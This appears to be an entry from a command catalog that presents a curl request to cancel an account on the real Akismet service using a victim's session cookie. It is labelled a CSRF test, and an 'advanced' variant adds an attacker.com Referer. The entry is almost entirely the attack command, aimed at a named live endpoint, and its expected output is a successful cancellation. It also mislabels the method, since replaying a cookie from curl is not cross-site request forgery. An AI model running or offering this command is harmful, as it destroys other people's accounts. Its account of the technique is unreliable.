---
data: >-
  curl -X POST 'https://akismet.com/api/account/1/cancel' -H 'Cookie:
  session=abc123' -d ''
tags:
  - csrf
  - web
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.502Z'
id: 61bb662b-f851-4efd-a785-5f88660968fe
verified: false
validated: true
submitted: true
---
# curl-post-csrf-account-cancel

## Command

```bash
curl -X POST 'https://akismet.com/api/account/1/cancel' -H 'Cookie: session=abc123' -d ''
```

## Description

This command simulates a CSRF attack by sending a POST request to cancel an Akismet account, using a provided session cookie. It tests the vulnerability where userid is ignored and no CSRF token is required.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `https://akismet.com/api/account/1/cancel` | Target endpoint (1 is ignored) | Yes |
| `-H 'Cookie: session=abc123'` | Victim's session cookie | Yes |
| `-d ''` | Empty body for the request | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://akismet.com/api/account/1/cancel' -H 'Cookie: session=abc123' -d ''
```

### Advanced Usage

```bash
curl -X POST 'https://akismet.com/api/account/1/cancel' -H 'Cookie: session=abc123' -H 'Referer: http://attacker.com' -d '' -v
```

## Expected Output

HTTP 200 or 302 redirect indicating successful cancellation, or account status update.

## Related

- [[Related Procedure]]
